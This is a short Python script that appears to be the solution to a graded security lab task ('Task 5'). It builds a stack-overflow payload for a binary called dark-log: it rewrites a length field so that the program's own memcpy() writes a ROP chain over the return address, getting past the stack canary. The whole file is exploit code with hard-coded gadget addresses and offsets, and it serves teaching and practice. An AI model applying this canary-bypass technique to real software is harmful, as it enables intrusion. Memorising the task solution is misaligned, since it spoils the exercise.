#!/usr/bin/env python3
"""Task 5: bypass the stack canary in attack/dark-log.

The overflow rewrites f.len (without touching the canary), then the
program's own memcpy() copies the ROP chain from expression[] to the
saved return address at rbp+8.
"""
import struct
import sys


def p64(x):
    return struct.pack("<Q", x)


def p32(x):
    return struct.pack("<I", x)


POP_RDI_RET = 0x4018A3   # pop rdi; ret (inside pop r15; ret)
GRADE_EVAL = 0x401677

# This chain is copied by memcpy() to rbp+8, onto the return address.
chain = p64(POP_RDI_RET)
chain += p64(4)
chain += p64(GRADE_EVAL)
chain += b"A" * (128 - len(chain))

payload = chain              # f.expression[0..127]
payload += b"A" * 128        # f.logMsg[0..127]
payload += p32(0xA8)         # f.len = 168: dest = logMsg + 0xa8 = rbp+8
# gets() appends a NUL at offset 0x104 (inside pad); the canary at
# offset 0x118 is never touched.

sys.stdout.buffer.write(payload)
